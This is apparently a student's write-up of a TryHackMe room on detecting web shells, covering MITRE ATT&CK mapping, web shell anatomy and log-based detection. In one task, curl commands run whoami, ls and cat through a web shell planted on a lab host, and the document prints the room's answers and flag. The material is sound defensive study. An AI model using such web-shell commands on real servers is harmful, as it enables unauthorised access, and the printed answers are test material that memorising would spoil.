# Detecting Web Shells

## Overview

In this room, we will explore web shell detection through analyzing logs, file systems, and network traffic.

<!--
**Answer:** > 

# Heading 1
## Heading 2
### Heading 3

For screenshots and captions
<div align="center">

*Caption here*

![alt text](image-url)

</div>


<a href=""></a>


### Command Executed
```bash

```

-->

## Task-1: Introduction

### Learning Objectives

- Understand what web shells are and how attackers use them
- Detect web shell activity through log, file system, and network analysis
- Understand common tooling in web shell detection

### Tools Used

- curl
- bash
- <a href="https://cyberchef.org">CyberChef</a>

### Prerequisites

- <a href="https://tryhackme.com/room/webapplicationbasics">Web Application Basics: Request Methods & Responses</a>
- <a href="https://tryhackme.com/room/introtologanalysis"> Intro to Log Analysis: Common Log Formats</a>
- <a href="https://tryhackme.com/room/mitre">MITRE: Initial Access & Tactics</a>

<h2>Questions</h2>

I understand the learning objectives and am ready to embark on a web shell adventure.

 > **Answer:** No answer needed

---

## Task-2: Web Shell Overview

<h2>Questions</h2>

<h3>Which MITRE ATT&CK Persistence sub-technique are web shells associated with?</h3>

This can be easily found with a quick internet search.

<div align="center">

*MITTRE ATT&CK Persistence Sub-Technique*

![MITRE ATT&CK Persistence Sub-Technique](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/Subtechnique.png)

</div>

 > **Answer:** T1505.003

<h2>What file extension is commonly used for web shells targeting Microsoft Exchange?</h2>

According to the examples presented in the lab of real-world web-shell deployment, the file extension commonly used for web shells targeting Microsoft Exchange is .aspx

> **Answer:** .aspx

---

## Task-3: Anatomy of a Web Shell

<h2>Questions</h2>

<h3>Access the shell and determine which account you have access to by running the whoami command.</h3>

I begin by going into the command line and using curl (a free and open source tool for tranferring data to and from a server using various protocols), and interact with the webshell(that has been depoloyed to the target machine on port 8080.

### Command Executed
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=whoami
```

### Command Output
```bash
www-data
```
<div align="center">

*whoami Command Executed on Deployed Web Shell*

![whoami](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/webshell_whoami.png)

</div>

Thus giving us our answer.

> **Answer:** www-data


<h3>List the directory contents and find the flag using the ls and cat commands.</h3>

When necessary, I made sure to URL encode my commands using CyberChef before interacting with the shell.

## Commands Executed

### Command 1 - ls
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=ls
```
### Command 1 - Output
```
bash
awebshell.php
flag.txt
```

### Command 2 - cat%20flag.txt
```bash
curl http://10.64.135.10:8080/files/awebshell.php?cmd=cat%20flag.txt
```

### Command 2 - Output
```bash
THM{W3b_Sh3ll_Usag3}
```
## Screencaptures

*I noticed that the URL encoding for a space (" ") is %20, which is something to keep note of for ease of reference!*

<div align="center>

*CyberChef URL Encode for cat flag.txt*
![CyberChef Encoding](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/urlencoding_cyberchef.png)

</div>

<div align="center>

*Listing out Directory Contents*

![Directory Contents](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/gettingflag_1.png)

</div>

<div align="center">

*Flag#1 Found!*

![Flag#1](https://github.com/amoham001/Write-Ups/blob/3f4fa7222c451b116549943a39272bc6e2ac1f3f/TryHackMe/Rooms/Detecting%20Web%20Shells/Screenshots/flag1_acquired.png)

</div>

> **Answer:** THM{W3b_Sh3ll_Usag3}

---
## Task 4: Log-Based Detection

<h2>Questions</h2>

The answer to the below questions can be found through the task readings, however let's elaborate on each answer for learning sake

<h3>What is the part of the URL that associates values to parameters and can be a valuable indicator of web shell activity?</h3>

> **Answer:** query strings

Query strings are the part of the URL that come after the question mark '?' symbol, and web shells commonly use these to accept commands, making them a key indicator of malicious activity.

<h3>What auditd syscall would confirm that a file was written to disk following a suspicious POST request to /upload.php?</h3>

> **Answer:** creat

"creat"
